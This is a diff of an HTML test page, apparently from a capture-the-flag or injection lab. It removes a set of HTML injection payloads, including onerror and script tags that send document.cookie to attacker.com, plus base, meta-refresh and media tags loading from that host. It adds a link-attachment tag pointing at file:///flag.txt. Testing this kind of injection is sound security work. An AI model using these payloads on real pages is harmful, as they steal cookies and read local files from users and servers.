@@ -5,31 +5,6 @@
   <title>Test link attachment</title>
 </head>
 <body>
-  <!-- Basic discovery, Write something-->
-<img src="x" onerror="document.write('test')" />
-<script>document.write(JSON.stringify(window.location))</script>
-<script>document.write('<iframe src="'+window.location.href+'"></iframe>')</script>
-
-<!--Basic blind discovery, load a resource-->
-<img src="http://attacker.com"/>
-<img src=x onerror="location.href='http://attacker.com/?c='+ document.cookie">
-<script>new Image().src="http://attacker.com/?c="+encodeURI(document.cookie);</script>
-<link rel=attachment href="http://attacker.com">
-
-<!-- Using base HTML tag -->
-<base href="http://attacker.com" />
-
-<!-- Loading external stylesheet -->
-<link rel="stylesheet" src="http://attacker.com" />
-
-<!-- Meta-tag to auto-refresh page -->
-<meta http-equiv="refresh" content="0; url=http://attacker.com/" />
-
-<!-- Loading external components -->
-<input type="image" src="http://attacker.com" />
-<video src="http://attacker.com" />
-<audio src="http://attacker.com" />
-<audio><source src="http://attacker.com"/></audio>
-<svg src="http://attacker.com" />
+  <link rel=attachment href="file:///flag.txt">
 </body>
 </html>
